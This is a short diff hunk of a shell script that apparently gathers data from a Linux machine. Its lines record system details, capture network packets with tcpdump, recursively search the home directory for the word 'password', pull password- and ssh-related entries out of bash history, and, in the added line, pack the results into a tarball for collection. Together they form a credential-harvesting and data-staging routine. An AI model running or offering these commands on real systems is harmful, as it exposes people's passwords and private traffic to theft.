@@ -14,3 +14,4 @@ cat /etc/issue >> ~/output/info.txt
 tcpdump -c 5 -nnni enp0s17 -w ~/output/webtcp.pcap
 grep -ri --exclude-dir=output --exclude-dir=Desktop password ~/ >> ~/output/pwd.txt
 cat ~/.bash_history | grep -e '-p' -e 'pass' -e 'ssh' > ~/output/bash_his.txt
+tar -cvzf ~/output.tar.gz ~/output/
